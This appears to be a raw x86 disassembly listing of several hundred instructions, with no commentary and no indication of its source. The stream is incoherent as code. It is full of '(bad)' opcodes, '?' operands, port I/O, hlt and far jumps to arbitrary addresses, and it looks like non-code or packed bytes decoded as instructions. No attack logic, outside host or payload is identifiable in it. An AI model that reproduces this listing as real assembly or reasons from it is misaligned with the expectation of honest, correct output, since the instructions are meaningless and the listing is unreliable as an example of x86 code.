  423957:	outs   dx,DWORD PTR ds:[esi]
  423958:	loop   0x4238de
  42395a:	mov    ebx,0xe6f0a8c
  42395f:	and    edi,DWORD PTR [esi+0x4d]
  423962:	or     BYTE PTR [esi+0x1f],dh
  423965:	ret    0xc5f7
  423968:	test   al,ch
  42396a:	sbb    ebp,DWORD PTR [ebp+0x7ad9c4af]
  423970:	sub    eax,0x76b3ea6e
  423975:	add    cl,dl
  423977:	leave  
  423978:	mov    ebx,0xf2d66d43
  42397d:	jns    0x423986
  42397f:	inc    ebp
  423980:	add    BYTE PTR [eax],al
  423982:	inc    ebx
  423983:	lea    ebx,[edi]
  423985:	and    bh,bl
  423987:	mov    dl,0x7f
  423989:	out    dx,eax
  42398a:	add    BYTE PTR [ebx-0x542dd8f0],dl
  423990:	mov    edx,0x1ad7032
  423995:	add    BYTE PTR [esi],ah
  423997:	add    eax,DWORD PTR [eax]
  423999:	add    ch,ah
  42399b:	lods   al,BYTE PTR ds:[esi]
  42399c:	pop    edi
  42399d:	dec    edx
  42399e:	sub    edx,DWORD PTR [edi+0x2cac56]
  4239a4:	sub    BYTE PTR [esi+0xfc2bb99],cl
  4239aa:	lds    edi,FWORD PTR [edi+0x2e]
  4239ad:	lock mov ebx,0x5040dc7
  4239b3:	jb     0x423958
  4239b5:	bound  ebx,QWORD PTR [eax]
  4239b7:	fistp  QWORD PTR [ebp-0x14ca4f75]
  4239bd:	cmc    
  4239be:	mov    dh,0x3b
  4239c0:	rcl    DWORD PTR [edx-0x7a6b20dc],1
  4239c6:	mov    ds:0xc9307bcb,eax
  4239cb:	xchg   edx,eax
  4239cc:	sub    BYTE PTR [ebx],ah
  4239ce:	loopne 0x4239a5
  4239d0:	jb     0x4239dd
  4239d2:	ss mov ebp,?
  4239d5:	xor    esp,DWORD PTR [ebp+0x63]
  4239d8:	jnp    0x423966
  4239da:	ja     0x4239c9
  4239dc:	pop    ds
  4239dd:	xor    BYTE PTR fs:[ebp-0x6a],ch
  4239e1:	ret    0xa32f
  4239e4:	xchg   ebx,eax
  4239e5:	pop    ebx
  4239e6:	or     al,0x7c
  4239e8:	mov    bh,0x1
  4239ea:	pushf  
  4239eb:	jg     0x4239b8
  4239ed:	into   
  4239ee:	or     edi,DWORD PTR [edi]
  4239f0:	xchg   edx,eax
  4239f1:	test   eax,0x5461a5
  4239f6:	mov    ds:0x11a1397c,eax
  4239fb:	jmp    0x62377c2
  423a00:	sub    al,BYTE PTR [eax-0x79]
  423a03:	shr    BYTE PTR [esi],cl
  423a05:	push   ebp
  423a06:	pop    ecx
  423a07:	xchg   BYTE PTR [esi+0x2d],cl
  423a0a:	ret    0xfd0b
  423a0d:	imul   eax,eax,0xfffffff5
  423a10:	push   0x9396d245
  423a15:	dec    esp
  423a16:	(bad)  [edx-0x6ce349d0]
  423a1c:	lods   al,BYTE PTR ds:[esi]
  423a1d:	call   0x75e3:0x8d8b6e56
  423a24:	dec    ebp
  423a25:	sbb    dl,BYTE PTR [eax]
  423a27:	and    al,0xc7
  423a29:	xchg   ecx,eax
  423a2a:	sub    DWORD PTR [ebx+0x1a2af2d],0xa5a2f04a
  423a34:	fwait
  423a35:	jp     0x423aab
  423a37:	shr    BYTE PTR ss:[edi+0x27],1
  423a3b:	add    eax,0xfd152d4
  423a40:	or     eax,0xe4dda8f6
  423a45:	mov    al,ds:0x3971b464
  423a4a:	or     BYTE PTR [ecx],ch
  423a4c:	repz cdq 
  423a4e:	push   ds
  423a4f:	es paddusw mm1,mm4
  423a53:	xor    DWORD PTR [esi-0x19],edx
  423a56:	pushf  
  423a57:	out    0x28,eax
  423a59:	and    bl,BYTE PTR [eax-0x28288b58]
  423a5f:	dec    esi
  423a60:	cwde   
  423a61:	adc    eax,0xe57a1ea0
  423a66:	xor    BYTE PTR [ebp-0x6d4e5839],bh
  423a6c:	shr    DWORD PTR [eax],1
  423a6e:	test   al,0xc5
  423a70:	xor    BYTE PTR [edx-0x4ecb9134],bl
  423a76:	rcl    DWORD PTR [eax],0x91
  423a79:	pop    esi
  423a7a:	inc    ebp
  423a7b:	push   ecx
  423a7c:	cmp    eax,0x69c7da3b
  423a81:	jg     0x423ab7
  423a83:	mov    ecx,0x64536f7c
  423a88:	pop    eax
  423a89:	(bad)  
  423a8a:	fcom   DWORD PTR [esi]
  423a8c:	xlat   BYTE PTR ds:[ebx]
  423a8d:	sbb    esp,esp
  423a8f:	inc    edi
  423a90:	sar    DWORD PTR [edi-0xe4c1d42],1
  423a96:	adc    DWORD PTR [ebx+0x1e],edx
  423a99:	aam    0x77
  423a9b:	les    edi,FWORD PTR [ebp+0x76]
  423a9e:	xchg   DWORD PTR [edx-0x3079f2e7],ebx
  423aa4:	sbb    al,0xeb
  423aa6:	std    
  423aa7:	push   edx
  423aa8:	xor    eax,0x311a2d9a
  423aad:	out    dx,eax
  423aae:	mov    eax,0x990185cd
  423ab3:	aas    
  423ab4:	jge    0x423a41
  423ab6:	jnp    0x423b11
  423ab8:	push   esi
  423ab9:	pop    esp
  423aba:	pop    esp
  423abb:	pop    ds
  423abc:	sbb    ebx,esi
  423abe:	mov    esp,0xaed54fe4
  423ac3:	(bad)  
  423ac4:	inc    esi
  423ac5:	dec    edi
  423ac6:	(bad)  
  423ac7:	mov    esi,0xaafa45ad
  423acc:	inc    edx
  423acd:	ficom  WORD PTR ds:0x2e924e35
  423ad3:	lahf   
  423ad4:	jmp    FWORD PTR [edi+0x76]
  423ad7:	test   eax,0x15012b59
  423adc:	jno    0x423b25
  423ade:	mov    bh,0x2f
  423ae0:	sbb    al,0x0
  423ae2:	sar    BYTE PTR [ecx+eax*1+0x24],cl
  423ae6:	hlt    
  423ae7:	dec    edx
  423ae8:	pop    eax
  423ae9:	or     bl,dh
  423aeb:	inc    eax
  423aec:	inc    ecx
  423aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423aee:	cmp    al,0xc7
  423af0:	push   ebp
  423af1:	int3   
  423af2:	sub    DWORD PTR [esi+ebx*2+0x73],ecx
  423af6:	test   BYTE PTR [esi+0x55],dl
  423af9:	and    ebx,eax
  423afb:	mov    ebx,0xa3c6f483
  423b00:	ror    DWORD PTR [edx],cl
  423b02:	arpl   WORD PTR [edx+eax*1-0x21],dx
  423b06:	cld    
  423b07:	arpl   di,cx
  423b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b0a:	pusha  
  423b0b:	fs push ecx
  423b0d:	push   es
  423b0e:	pop    ebx
  423b0f:	jmp    0xe5625828
  423b14:	sub    DWORD PTR [ebp+0x5d2695bf],esp
  423b1a:	xor    dl,0x38
  423b1d:	pop    ebx
  423b1e:	cmp    ebp,DWORD PTR [edi]
  423b20:	fld    TBYTE PTR [eax]
  423b22:	lock pop esp
  423b24:	inc    eax
  423b25:	dec    esp
  423b26:	pop    eax
  423b27:	and    DWORD PTR [edi-0x57efecbb],eax
  423b2d:	jmp    0xf8411115
  423b32:	adc    dl,BYTE PTR [ebx+0x1a]
  423b35:	(bad)  
  423b36:	loope  0x423b66
  423b38:	push   eax
  423b39:	sub    eax,0x33a211a6
  423b3e:	rcr    edi,1
  423b40:	mov    bh,BYTE PTR [eax-0x1b0e911]
  423b46:	into   
  423b47:	cmp    al,0xf8
  423b49:	jo     0x423adf
  423b4b:	mov    dh,0x38
  423b4d:	mov    dh,0xa1
  423b4f:	lods   eax,DWORD PTR ds:[esi]
  423b50:	xchg   ebp,eax
  423b51:	sahf   
  423b52:	js     0x423b66
  423b54:	push   cs
  423b55:	mov    edi,DWORD PTR [eax]
  423b57:	out    0xbb,al
  423b59:	adc    BYTE PTR [ebx+0x4c],bl
  423b5c:	test   eax,0xcfc6c07
  423b61:	bswap  ebx
  423b63:	data16 and al,cl
  423b66:	out    dx,al
  423b67:	and    ch,BYTE PTR [esi-0x7a]
  423b6a:	push   edx
  423b6b:	adc    DWORD PTR [eax-0x1c3e60cd],eax
  423b71:	das    
  423b72:	rcr    edx,0x1e
  423b75:	and    eax,0xe0413885
  423b7a:	pusha  
  423b7b:	popa   
  423b7c:	lahf   
  423b7d:	mov    ch,0x9a
  423b7f:	out    0x7c,eax
  423b81:	lds    ebp,FWORD PTR [ecx+0x39]
  423b84:	bound  ebp,QWORD PTR [edx+eax*2-0x2237c560]
  423b8b:	lds    ebp,FWORD PTR [eax+0x7e]
  423b8e:	std    
  423b8f:	ins    BYTE PTR es:[edi],dx
  423b90:	and    BYTE PTR [ecx-0xd],al
  423b93:	jge    0x423baf
  423b95:	dec    esp
  423b96:	retf   0x295d
  423b99:	cmp    BYTE PTR [ecx-0x10f078dc],dh
  423b9f:	arpl   si,ax
  423ba1:	jge    0x423b40
  423ba3:	clc    
  423ba4:	inc    esi
  423ba5:	cwde   
  423ba6:	xor    DWORD PTR [ebx],esi
  423ba8:	jmp    0xbf5b1b6d
  423bad:	cmp    BYTE PTR [edi],0x6e
  423bb0:	hlt    
  423bb1:	xchg   edx,eax
  423bb2:	fs es jno 0x423c1f
  423bb6:	sub    ebx,DWORD PTR [edi-0x429f5504]
  423bbc:	dec    edx
  423bbd:	mov    dl,0x62
  423bbf:	and    al,0x9
  423bc1:	mov    ch,0x5e
  423bc3:	sub    BYTE PTR [edi+0x45],ah
  423bc6:	push   ebx
  423bc7:	jecxz  0x423bbe
  423bc9:	mov    al,0x7e
  423bcb:	fadd   QWORD PTR ds:0x587addbd
  423bd1:	adc    ebx,DWORD PTR [ebx]
  423bd3:	mov    ds:0x3608c8e7,eax
  423bd8:	hlt    
  423bd9:	scas   eax,DWORD PTR es:[edi]
  423bda:	sar    edx,1
  423bdc:	xor    al,0xb
  423bde:	mov    cl,0xe4
  423be0:	les    ebx,FWORD PTR [ebx]
  423be2:	inc    ebx
  423be3:	bound  esp,QWORD PTR ds:0x112c2cd2
  423be9:	jno    0x423c40
  423beb:	out    0xa4,eax
  423bed:	jmp    0xb87b:0xf68a4000
  423bf4:	jns    0x423c5c
  423bf6:	repnz mov edi,0x7991aaa3
  423bfc:	pop    edi
  423bfd:	dec    ebp
  423bfe:	push   ss
  423bff:	mov    cl,0xcf
  423c01:	add    bh,BYTE PTR [ebx]
  423c03:	push   edx
  423c04:	pop    edx
  423c05:	fstp   QWORD PTR [edi]
  423c07:	mov    cl,0x90
  423c09:	(bad)
  423c0e:	data16 sbb al,0xbc
  423c11:	lods   eax,DWORD PTR ds:[esi]
  423c12:	inc    edx
  423c13:	ficom  WORD PTR [edx+ebx*2+0x1df737e1]
  423c1a:	loop   0x423bef
  423c1c:	inc    esp
  423c1d:	mov    ebx,0x2518d53a
  423c22:	jl     0x423c00
  423c24:	add    esi,DWORD PTR [esi+0x5a]
  423c27:	sti    
  423c28:	jns    0x423ca4
  423c2a:	lea    ecx,[ebp+0x30]
  423c2d:	int3   
  423c2e:	stc    
  423c2f:	sbb    BYTE PTR [esi-0x31a266d1],al
  423c35:	lods   eax,DWORD PTR ds:[esi]
  423c36:	mov    edi,0x450b599e
  423c3b:	sbb    DWORD PTR [ebx+0x6dc0e6b1],esp
  423c41:	adc    ch,BYTE PTR [ecx]
  423c43:	add    BYTE PTR [ebx],dl
  423c45:	jb     0x423cc2
  423c47:	inc    ebx
  423c48:	clc    
  423c49:	addr16 jl 0x423c5d
  423c4c:	and    ah,dl
  423c4e:	inc    eax
  423c4f:	cmp    BYTE PTR [esi+0x64],cl
  423c52:	outs   dx,DWORD PTR ds:[esi]
  423c53:	retf   
  423c54:	(bad)  
  423c55:	fadd   DWORD PTR [ebp+ecx*4+0x58218c8]
  423c5c:	(bad)  [esi+0x5e19e7a2]
  423c62:	push   ds
  423c63:	int3   
  423c64:	dec    eax
  423c65:	xor    al,0xb8
  423c67:	pop    edx
  423c68:	aad    0x3
  423c6a:	and    al,0xd5
  423c6c:	push   cs
  423c6d:	push   edx
  423c6e:	mov    al,0x1
  423c70:	outs   dx,BYTE PTR ds:[esi]
  423c71:	pop    ebp
  423c72:	cmc    
  423c73:	jo     0x423c86
  423c75:	jmp    0x423cb3
  423c77:	or     bh,BYTE PTR [edi+0x29]
  423c7a:	out    dx,eax
  423c7b:	mov    ds:0x3c4abefb,eax
  423c80:	push   edx
  423c81:	pop    ebp
  423c82:	mov    esi,0xa7f1c842
  423c87:	mov    ah,0x3a
  423c89:	jle    0x423ceb
  423c8b:	fs sbb ebp,esp
  423c8e:	xchg   edi,eax
  423c8f:	pop    edi
  423c90:	ss or  esi,edi
  423c93:	jo     0x423cd2
  423c95:	fidiv  WORD PTR [edi-0x48]
  423c98:	ret    
  423c99:	jg     0x423c89
  423c9b:	or     BYTE PTR [edx],bh
  423c9d:	inc    edx
  423c9e:	(bad)
  423ca2:	jnp    0x423cf6
  423ca4:	lock sar BYTE PTR [edi+eax*4-0x49],cl
  423ca9:	xor    BYTE PTR [eax+0x59],bl
  423cac:	arpl   WORD PTR [ebx-0x24564abc],si
  423cb2:	xor    DWORD PTR ds:0x440fd440,ebp
  423cb8:	push   eax
  423cb9:	sub    bl,BYTE PTR [ebp-0x1008616f]
  423cbf:	sbb    eax,0x39f40000
  423cc4:	xchg   edx,eax
  423cc5:	jg     0x423ca6
  423cc7:	(bad)  
  423cc8:	std    
  423cc9:	mov    ebx,0xc0721507
  423cce:	cmp    DWORD PTR [ebp-0x4f692366],esp
  423cd4:	add    DWORD PTR [eax],eax
  423cd6:	add    eax,DWORD PTR es:[eax]
  423cd9:	add    BYTE PTR [esi+ebp*1],bl
  423cdc:	ficom  WORD PTR [edx+0x1012ae90]
  423ce2:	fsubr  DWORD PTR ds:0x40b178bd
  423ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ce9:	dec    eax
  423cea:	pop    ds
  423ceb:	cmp    bh,BYTE PTR [ebx]
  423ced:	fxtract 
  423cef:	jbe    0x423d06
  423cf1:	mov    ah,0x3c
  423cf3:	sub    bl,BYTE PTR [ebx-0x5a]
  423cf6:	into   
  423cf7:	push   edi
  423cf8:	ds sub eax,0x401a8820
  423cfe:	add    dh,ah
  423d00:	ss ret 0x7de6
  423d04:	add    eax,0x1dddd42b
  423d09:	(bad)  
  423d0a:	xor    BYTE PTR [ebp+ebp*1-0x7a],ch
  423d0e:	stos   BYTE PTR es:[edi],al
  423d0f:	xchg   esi,eax
  423d10:	fistp  QWORD PTR [ebp-0x3c]
  423d13:	or     eax,0x44aa4c40
  423d18:	jle    0x423caf
  423d1a:	mov    ecx,0xa24de30c
  423d1f:	sbb    BYTE PTR [ebx+0x36bb38fb],bl
  423d25:	data16 aam 0xae
  423d28:	rcl    BYTE PTR ds:0x75d24e22,0xb3
  423d2f:	rcl    bh,cl
  423d31:	lea    ecx,[esi]
  423d33:	sub    DWORD PTR [ecx],0x75173e56
  423d39:	push   ds
  423d3a:	aam    0x48
  423d3c:	lea    esp,[edx]
  423d3e:	(bad)  
  423d3f:	std    
  423d40:	retf   0x158b
  423d43:	mov    esi,ebx
  423d45:	test   eax,0x803b7936
  423d4a:	aam    0xa9
  423d4c:	fild   WORD PTR [edx+0x2b600fd9]
  423d52:	out    0x5a,eax
  423d54:	cs push esi
  423d56:	pop    edx
  423d57:	inc    esi
  423d58:	js     0x423d0e
  423d5a:	ficomp WORD PTR [ecx]
  423d5c:	mov    ebx,0x29263220
  423d61:	repnz aad 0xfc
  423d64:	xchg   ebx,eax
  423d65:	push   ss
  423d66:	inc    edi
  423d67:	sbb    DWORD PTR [ebx],ebp
  423d69:	jb     0x423d40
  423d6b:	mov    ds:0x54532e61,al
  423d70:	mov    ah,0x12
  423d72:	jnp    0x423d45
  423d74:	pop    edx
  423d75:	xchg   edi,eax
  423d76:	ss fdivp st(0),st
  423d79:	sbb    eax,0x36728b32
  423d7e:	xchg   esp,eax
  423d7f:	lds    eax,FWORD PTR [edi+ebp*8+0x20]
  423d83:	sbb    al,0x5f
  423d85:	add    bl,BYTE PTR fs:[edi-0xe60ccc8]
  423d8c:	mov    cl,0x3b
  423d8e:	lods   eax,DWORD PTR ds:[esi]
  423d8f:	clc    
  423d90:	xor    eax,0x8dde8d96
  423d95:	lods   al,BYTE PTR ds:[esi]
  423d96:	(bad)  
  423d97:	sub    eax,0x47622664
  423d9c:	add    eax,0xd7029f91
  423da1:	hlt    
  423da2:	ret    
  423da3:	sbb    DWORD PTR [edx+ebp*8],esi
  423da6:	pop    esi
  423da7:	aas    
  423da8:	sbb    eax,0x8cafda45
  423dad:	mov    esp,?
  423daf:	adc    DWORD PTR [edx+0x5382d7b2],ebp
  423db5:	pop    ebx
  423db6:	xchg   edi,eax
  423db7:	or     BYTE PTR [esi+0x77045e30],ch
  423dbd:	sbb    BYTE PTR [edi-0xc605245],0x4f
  423dc4:	push   ebp
  423dc5:	jno    0x423d80
  423dc7:	mov    ecx,0x8e135cc1
  423dcc:	lahf   
  423dcd:	inc    edx
  423dce:	ins    DWORD PTR es:[edi],dx
  423dcf:	in     eax,dx
  423dd0:	in     eax,dx
  423dd1:	push   0xffffff9c
  423dd3:	(bad)
  423dd7:	ret    0xf2f8
  423dda:	dec    edi
  423ddb:	mov    eax,ds:0x8f9f82ec
  423de0:	cld    
  423de1:	pop    ebp
  423de2:	mov    dh,0x4
  423de4:	pop    edx
  423de5:	push   ecx
  423de6:	fisttp QWORD PTR [ebp+edi*8+0x573d6f3e]
  423ded:	cmp    DWORD PTR [esi],ecx
  423def:	pusha  
  423df0:	shl    DWORD PTR [esi],0xbf
  423df3:	jmp    0x423df3
  423df5:	pop    es
  423df6:	pop    ebp
  423df7:	loope  0x423dbd
  423df9:	pop    eax
  423dfa:	push   ss
  423dfb:	mov    al,ds:0x7ea801d1
  423e00:	jbe    0x423e23
  423e02:	add    BYTE PTR [edi-0x6b730430],bh
  423e08:	sbb    al,0xf2
  423e0a:	pop    eax
  423e0b:	mov    cs,WORD PTR [eax-0x509750bd]
  423e11:	loop   0x423de4
  423e13:	sub    al,0x37
  423e15:	idiv   al
  423e17:	dec    eax
  423e18:	ds sbb edi,ecx
  423e1b:	inc    edi
  423e1c:	sbb    al,0x1c
  423e1e:	sub    BYTE PTR [edi-0x40],0x4a
  423e22:	mov    ss,WORD PTR ds:0xada23632
  423e28:	mov    esp,esi
  423e2a:	xchg   ebx,eax
  423e2b:	xor    eax,0x405e9cfa
  423e30:	shr    ebp,0x84
  423e33:	jle    0x423eac
  423e35:	sub    BYTE PTR [esi],0x5c
  423e38:	mov    gs,WORD PTR [ebp+0x3c]
  423e3b:	mov    ebx,0x4ad7c0d1
  423e40:	push   cs
  423e41:	push   cs
  423e42:	adc    dh,BYTE PTR [ebx-0x38fa27c4]
  423e48:	and    BYTE PTR [ecx],0xb7
  423e4b:	xor    al,0xf3
  423e4d:	repz bound ebp,QWORD PTR [esi-0x7a]
  423e51:	(bad)  
  423e52:	lds    edx,FWORD PTR [ecx-0xd]
  423e55:	loopne 0x423e6f
  423e57:	fsub   st,st(5)
  423e59:	test   BYTE PTR [ebx],dh
  423e5b:	es mov edi,0x63390dd9
  423e61:	jle    0x423de6
  423e63:	mov    al,0x2b
  423e65:	(bad)  [eax-0x4f]
  423e68:	pop    es
  423e69:	and    BYTE PTR ds:0xab0b5f45,al
  423e6f:	je     0x423ee5
  423e71:	cwde   
  423e72:	cmp    bl,BYTE PTR [esi-0x167cf729]
  423e78:	call   0x7e1e:0x9948b33d
  423e7f:	shl    ecx,1
  423e81:	sbb    edi,DWORD PTR [ebx+0x28]
  423e84:	ds jmp 0x971e:0x3228f187
  423e8c:	mov    dh,0x87
  423e8e:	mov    eax,ds:0x9b599ac8
  423e93:	sbb    eax,0xca9bed48
  423e98:	stc    
  423e99:	inc    eax
  423e9a:	(bad)  
  423e9b:	cwde   
  423e9c:	lahf   
  423e9d:	pusha  
  423e9e:	out    0x18,al
  423ea0:	(bad)  
  423ea1:	push   0xdb7a7af2
  423ea6:	mov    eax,ds:0x8de1be3
  423eab:	call   0xa8c0adc3
  423eb0:	popa   
  423eb1:	xchg   esp,eax
  423eb2:	bound  ebp,QWORD PTR [ebx]
  423eb4:	idiv   bh
  423eb6:	inc    esi
  423eb7:	rol    esp,cl
  423eb9:	pop    ds
  423eba:	shl    BYTE PTR [esi-0x40ade72],0x20
  423ec1:	fidiv  DWORD PTR [edi+0x560b5dba]
  423ec7:	leave  
  423ec8:	adc    BYTE PTR [ebp+edi*8+0x49dcec6c],0xef
  423ed0:	xor    BYTE PTR [eax],dl
  423ed2:	(bad)  
  423ed3:	push   ss
  423ed4:	sbb    eax,DWORD PTR [edi-0x3c57f2de]
  423eda:	sub    ecx,eax
  423edc:	sbb    al,0xee
  423ede:	and    BYTE PTR [esi+0x2d14af14],bh
  423ee4:	fs addr16 (bad) 
  423ee7:	jbe    0x423f5c
  423ee9:	call   0xc736f4ad
  423eee:	pushf  
  423eef:	inc    ebp
  423ef0:	fs mov ecx,0xf8b387f8
  423ef6:	pop    esi
  423ef7:	dec    edx
  423ef8:	xchg   DWORD PTR [ebp+0x6d],edx
  423efb:	popa   
  423efc:	jne    0x423f4c
  423efe:	mov    esi,0x14a086b1
  423f03:	cwde   
  423f04:	sbb    BYTE PTR [esi-0x24518969],bl
  423f0a:	add    eax,0xede142f7
  423f0f:	mov    ebx,edx
  423f11:	cmp    al,0x67
  423f13:	mov    al,0x6c
  423f15:	ds jle 0x423f2c
  423f18:	add    BYTE PTR [ecx+0x6f9c593b],bh
  423f1e:	inc    ecx
  423f1f:	arpl   bx,dx
  423f21:	xchg   esi,eax
  423f22:	inc    esi
  423f23:	jo     0x423ee3
  423f25:	mov    dl,0x5e
  423f27:	mov    bl,0x60
  423f29:	ficomp WORD PTR [edx-0x47dd5fb8]
  423f2f:	and    al,0x94
  423f31:	pop    ebp
  423f32:	lods   eax,DWORD PTR ds:[esi]
  423f33:	cmp    bl,al
  423f35:	stos   DWORD PTR es:[di],eax
  423f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f38:	pop    ebx
  423f39:	(bad)
  423f3e:	stc    
  423f3f:	add    ecx,edi
  423f41:	je     0x423eca
  423f43:	add    esp,DWORD PTR [edx+ebx*2]
  423f46:	cli    
  423f47:	dec    esi
  423f48:	addr16 aad 0x91
  423f4b:	mov    ebx,0x43a5e906
  423f50:	mov    ebp,0x3670a23e
  423f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f56:	ja     0x423eda
  423f58:	lods   al,BYTE PTR ds:[esi]
  423f59:	or     BYTE PTR [ebp+0x71],al
  423f5c:	sbb    al,BYTE PTR [esi-0x6a]
  423f5f:	in     eax,dx
  423f60:	mov    ebp,0xceec838
  423f65:	pop    esi
  423f66:	xlat   BYTE PTR ds:[ebx]
  423f67:	das    
  423f68:	mov    ebp,0xcf21e8d1
  423f6d:	test   BYTE PTR [ebp+0x32],dl
  423f70:	not    DWORD PTR ss:[esi]
  423f73:	(bad)  
  423f74:	div    ch
  423f76:	mov    ss,WORD PTR [ebx-0xe6ca49b]
  423f7c:	cmp    dh,BYTE PTR [esi-0x11]
  423f7f:	and    BYTE PTR [edx+0x45],dh
  423f82:	inc    eax
  423f83:	loope  0x423f17
  423f85:	lods   eax,DWORD PTR ds:[esi]
  423f86:	leave  
  423f87:	aaa    
  423f88:	addr16 ret 
  423f8a:	xchg   ebp,eax
  423f8b:	fild   QWORD PTR [ebx-0x59cfc68b]
  423f91:	or     BYTE PTR [esi-0x21ddd35e],dl
  423f97:	jmp    0xb68c363
  423f9c:	test   al,0xc
  423f9e:	cmp    BYTE PTR [edx+0x47],bh
  423fa1:	pop    ebp
  423fa2:	ds xchg ebp,eax
  423fa4:	loope  0x423f89
  423fa6:	enter  0xc9f6,0x64
  423faa:	and    bh,BYTE PTR [esi]
  423fac:	cdq    
  423fad:	out    dx,al
  423fae:	loope  0x423ff2
  423fb0:	out    dx,eax
  423fb1:	mov    ?,WORD PTR [ecx-0x61f0e0f5]
  423fb7:	(bad)  
  423fb9:	jns    0x42403a
  423fbb:	push   esp
  423fbc:	push   es
  423fbd:	mov    ds:0x15bd860e,eax
  423fc2:	ret    
  423fc3:	dec    esp
  423fc4:	je     0x424017
  423fc6:	sub    DWORD PTR [ecx-0x24],ecx
  423fc9:	add    dh,BYTE PTR [ebx+eiz*8-0x63]
  423fcd:	jg     0x424023
  423fcf:	mov    al,ds:0xfed9058e
  423fd4:	pushf  
  423fd5:	mov    bl,0x5c
  423fd7:	mov    dh,0x19
  423fd9:	rcl    BYTE PTR [ebx+ebp*4-0x22420bbe],1
  423fe0:	arpl   WORD PTR ds:0x1079a7d5,ax
  423fe6:	push   cs
  423fe7:	test   DWORD PTR [edx+0x66e7a71d],edx
  423fed:	ret    0xe1be
  423ff0:	loop   0x423f7e
  423ff2:	outs   dx,BYTE PTR ds:[esi]
  423ff3:	les    edx,FWORD PTR [esi+0x2f]
  423ff6:	stc    
  423ff7:	or     al,0x8
  423ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ffa:	hlt    
  423ffb:	inc    edx
  423ffc:	daa    
  423ffd:	into   
  423ffe:	push   ecx
  423fff:	cmp    DWORD PTR [eax],eax
  424001:	add    BYTE PTR [esi+edi*1+0x24],dl
  424005:	sbb    DWORD PTR [esi+0x1b],ebp
  424008:	jge    0x424089
  42400a:	(bad)  
  42400b:	mov    eax,0x20aacfc0
  424010:	mov    DWORD PTR [esp+edi*4-0x4d],eax
  424014:	add    DWORD PTR [eax],eax
  424016:	add    eax,DWORD PTR es:[eax]
  424019:	add    BYTE PTR [ebx+ebx*8-0xd],ah
  42401d:	mov    bl,0xd6
  42401f:	xlat   BYTE PTR ds:[ebx]
  424020:	retf   
  424021:	test   eax,0xaa57b994
  424026:	in     eax,dx
  424027:	(bad)  
  424028:	(bad)
  42402c:	mov    ds:0xe89d4d40,eax
  424031:	add    DWORD PTR [ebx],esp
  424033:	mov    ecx,0x3aeeac04
  424038:	inc    edx
  424039:	and    al,0xa5
  42403b:	mov    ecx,0xb23cc8ad
  424040:	mov    edx,0xfe6eb948
  424045:	je     0x424054
  424047:	in     al,0xb8
  424049:	mov    cs,ebx
  42404b:	sti    
  42404c:	fiadd  DWORD PTR [ecx]
  42404e:	aad    0x97
  424050:	repz daa 
  424052:	adc    edi,DWORD PTR [esp+ebx*8-0x51882cf0]
  424059:	fcomp  DWORD PTR [edx-0x3a]
  42405c:	outs   dx,DWORD PTR ds:[esi]
  42405d:	out    dx,eax
  42405e:	test   al,0x5e
  424060:	scas   eax,DWORD PTR es:[edi]
  424061:	mov    edx,0xdedb0680
  424066:	test   eax,0xd0625296
  42406b:	jmp    0x2f8e:0x9fa3c14b
  424072:	inc    edx
  424073:	sub    eax,0x89614aa6
  424078:	xchg   edi,eax
  424079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42407a:	jbe    0x4240d3
  42407c:	(bad)  
  42407e:	shl    DWORD PTR [eax],1
  424080:	sub    DWORD PTR [eax-0x38],edx
  424083:	mov    al,0x28
  424085:	mov    edi,0xc42a222a
  42408a:	add    dl,BYTE PTR ds:0xc0d6a70a
  424090:	(bad)  
  424091:	or     BYTE PTR [edx],bh
  424093:	ja     0x4240e3
  424095:	push   ss
  424096:	loop   0x4240c1
  424098:	and    dh,BYTE PTR [eax]
  42409a:	(bad)  
  42409b:	scas   eax,DWORD PTR es:[edi]
  42409c:	pop    ss
  42409d:	daa    
  42409e:	inc    ecx
  42409f:	xchg   edx,eax
  4240a0:	add    eax,0x25e78477
  4240a5:	neg    DWORD PTR [ebx]
  4240a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240a8:	in     eax,0x71
  4240aa:	div    BYTE PTR [ecx]
  4240ac:	add    eax,0x5304c41
  4240b2:	xchg   esp,eax
  4240b3:	and    eax,0xd72c2961
  4240b8:	mov    esi,0xa4162df4
  4240bd:	jge    0x424105
  4240bf:	dec    esp
  4240c0:	out    dx,eax
  4240c1:	or     ebx,DWORD PTR [edx+0x56]
  4240c4:	fistp  DWORD PTR [eax+eiz*8+0x4466d480]
  4240cb:	repz jae 0x4240ba
  4240ce:	push   cs
  4240cf:	ins    DWORD PTR es:[edi],dx
  4240d0:	repz and al,0x8f
  4240d3:	pop    ebx
  4240d4:	aam    0xb0
  4240d6:	jmp    0x58ca:0x5110e80d
  4240dd:	enter  0xba11,0x51
  4240e1:	sub    BYTE PTR [edi],bh
  4240e3:	adc    DWORD PTR [edi-0x25654cd5],eax
  4240e9:	ja     0x42410a
  4240eb:	ds xor al,0x3b
  4240ee:	xchg   BYTE PTR [esp+eax*4],bl
  4240f1:	loope  0x424087
  4240f3:	add    esp,ebp
  4240f5:	cmp    al,0xf1
  4240f7:	pop    ds
  4240f8:	mov    ebp,0x851340b7
  4240fd:	in     eax,0x50
  4240ff:	add    DWORD PTR [ebp-0x50fe0887],esi
  424105:	mov    ecx,0xe352113e
  42410a:	fs push es
  42410c:	push   es
  42410d:	mov    BYTE PTR [esi-0x77],dl
  424110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424111:	or     BYTE PTR [ebp-0x5c8cfd7a],dl
  424117:	rcl    DWORD PTR [ebp-0x3523806d],1
  42411d:	push   ss
  42411e:	and    dl,ah
  424120:	addr16 cdq 
  424122:	jmp    0x42416a
  424124:	fidivr DWORD PTR [ebp+0x42]
  424127:	inc    esi
  424128:	jns    0x424139
  42412a:	out    dx,al
  42412b:	scas   al,BYTE PTR es:[edi]
  42412c:	xchg   BYTE PTR [ebp+0x44d43ae7],dl
  424132:	pop    eax
  424133:	out    0xad,al
  424135:	mov    ebp,0xdd8b61c1
  42413a:	ins    BYTE PTR es:[edi],dx
  42413b:	add    dl,BYTE PTR [ebx+eiz*2]
  42413e:	add    DWORD PTR [ecx],esp
  424140:	out    0x77,eax
  424142:	out    dx,eax
